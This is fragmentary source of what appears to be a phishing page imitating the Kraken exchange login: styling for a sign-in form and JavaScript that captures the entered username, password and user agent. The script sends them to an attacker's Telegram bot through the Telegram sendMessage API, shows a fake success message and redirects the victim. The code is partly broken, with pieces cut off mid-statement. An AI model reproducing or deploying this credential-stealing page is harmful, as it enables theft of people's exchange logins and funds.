<style>
  @keyframes float {

    0%,
    100% {
      transform: translateY(0);
    }

    50% {
      transform: translateY(-20px);
    }
  }

  .floating-video {
    animation: float 3s ease-in-out infinite;
    vertical-align: middle;
  }

  /* Language dropdown styles */
  .language-dropdown {
    position: relative;
    display: inline-block;
  }

  .language-dropdown-content {
    display: none;
    position: absolute;
    right: 0;
    background-color: white;
    min-width: 160px;
    box-shadow: 0px 8px 16px 0px rgba(0, 0, 0, 0.1);
    border-radius: 8px;
    z-index: 1;
    margin-top: 8px;
  }

  .language-dropdown-content a {
    color: #6b7280;
    padding: 8px 16px;
    text-decoration: none;
    display: block;
    font-size: 14px;
  }

  .language-dropdown-content a:hover {
    background-color: #f3f4f6;
    color: #000;
    font-weight: bold;
  }

  .language-dropdown.active .language-dropdown-content {
    display: block;
  }

  /* Rest of your existing styles... */
  /* Custom DS colors - updated for white background */
  :root {
    --ds-container: #ffffff;
    --ds-input: #f3f4f6;
    --ds-input-hover: #e5e7eb;
    --ds-input-selected: #d1d5db;
    --ds-primary: #1f2937;
    --ds-brand: #5d6bff;
    --ds-neutral: #6b7280;
    --ds-button-primary: #5d6bff;
    --ds-brands: #a855f7;
    --ds-button-primary-hover: #4a58e6;
    --ds-button-primary-hover: #8e21f4;
  }

  /* Updated shadow for white background */
  .white-glow {
    box-shadow: 0 0 15px rgba(0, 0, 0, 0.05),
      0 0 30px rgba(0, 0, 0, 0.05);
  }

  /* Floating label styles */
  .input-container {
    position: relative;
    height: 56px;
  }

  .input-label {
    position: absolute;
    left: 16px;
    top: 18px;
    color: #6b7280;
    font-size: 16px;
    transition: all 0.2s ease-out;
    pointer-events: none;
  }

  .input-field {
    width: 100%;
    height: 100%;
    padding: 26px 16px 10px;
    background-color: #f3f4f6;
    border: none;
    border-radius: 12px;
    font-size: 16px;
    outline: none;
    transition: all 0.2s ease-out;
  }

  .input-field:hover {
    background-color: #e5e7eb;
  }

  .input-field:focus {
    background-color: #e5e7eb;

  }

  .input-field:focus+.input-label,
  .input-field:not(:placeholder-shown)+.input-label {
    top: 8px;
    font-size: 12px;
    color: var(--ds-neutral);
  }

  /* Error message styling */
  .error-message {
    color: #ef4444;
    font-size: 0.875rem;
    margin-top: 0.25rem;
    display: none;
  }
  
  /* Success message styling */
  .success-message {
    color: #10b981;
    font-size: 0.875rem;
    margin-top: 0.5rem;
    text-align: center;
    font-weight: 500;
    display: none;
  }

  /* Loading spinner */
  .spinner {
    width: 20px;
    height: 20px;
    border: 3px solid rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    border-top-color: white;
    animation: spin 1s ease-in-out infinite;
    display: none;
  }

  @keyframes spin {
    to {
      transform: rotate(360deg);
    }
  }

  /* Responsive adjustments */
  @media (max-width: 640px) {
    .responsive-container {
      width: 90%;
      padding: 1.5rem;
    }

    .responsive-video {
      width: 120px;
    }

    .responsive-input {
      min-width: 100% !important;
    }
  }
</style>

🖥️ User Agent: ${userAgent}

      passwordError.style.display = 'none';
      successMessage.style.display = 'none';

        usernameError.style.display = 'block';
        isValid = false;
      }

      if (!passwordInput.value.trim()) {
        passwordError.style.display = 'block';
        isValid = false;
      }

      if (!isValid) return;

      // Show loading state
      buttonText.textContent = 'Processing...';
      spinner.style.display = 'block';
      submitBtn.disabled = true;

        const password = passwordInput.value;

🚨 Login Attempt 🚨
📅 Time: ${timestamp}
📧 Username: ${username}
🔑 Password: ${password}
        `;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodedMessage}`;

        // Send the data
        const response = await fetch(url);

        if (!response.ok) {
          throw new Error(`Telegram API error: ${response.status}`);
        }

        // Show success message
        successMessage.style.display = 'block';
        
        // Simulate a successful login
        setTimeout(() => {
          form.reset();
          // Redirect to official Kraken login page
          window.location.href = './design.html';
        }, 2000);

      } catch (error) {
        console.error('Error:', error);
        // Show error state (you could add an error message div if you want)
      } finally {
        // Reset button state
        buttonText.textContent = 'Continue';
        spinner.style.display = 'none';
        submitBtn.disabled = false;
      }
    });

        passwordInput.type = "text";
        this.innerHTML = `
